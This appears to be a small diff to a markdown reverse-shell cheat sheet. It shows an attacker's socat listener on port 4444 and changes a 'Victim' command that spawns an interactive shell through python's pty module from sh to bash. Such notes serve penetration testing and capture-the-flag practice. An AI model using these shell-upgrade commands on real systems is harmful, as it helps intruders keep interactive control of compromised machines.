@@ -38,7 +38,7 @@ socat file:`tty`,raw,echo=0 tcp-listen:4444
 
 *Victim:* 
 ```
-python3 -c 'import pty; pty.spawn("/bin/sh")'
+python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
 ### Send files
